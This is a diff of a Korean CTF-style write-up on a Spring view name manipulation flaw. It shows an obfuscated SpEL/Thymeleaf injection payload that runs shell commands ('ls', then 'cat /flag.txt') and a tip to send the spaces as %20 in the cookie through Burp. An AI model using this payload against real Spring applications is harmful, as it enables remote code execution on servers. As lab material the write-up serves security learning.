@@ -224,3 +224,12 @@ Spring View Name Manipulation 취약점인데, 내부 라이브러리에서 발�
 
 ```${''.getClass().forName('j'+'ava.util.Scanner').getConstructor(''.getClass().forName('j'+'ava.io.InputStream')).newInstance(''.getClass().forName('j'+'ava.lang.Run'+'time').getMethods()[6].invoke(null).exec('ls').getInputStream()).next()}::```
  
+<br>
+
+쿠키의 특징때문에 불편했는데, 이는 브라우저에서만 적용되는 것이라고 한다.
+
+따라서 burp를 이용해서 해보면 공백을 ```%20```으로 넣어서 하면 작동한다.
+
+플래그 출력을 위해 ```cat /flag.txt```를 해주면 된다.
+
+위치는 어떻게 찾는진 모르겠다..
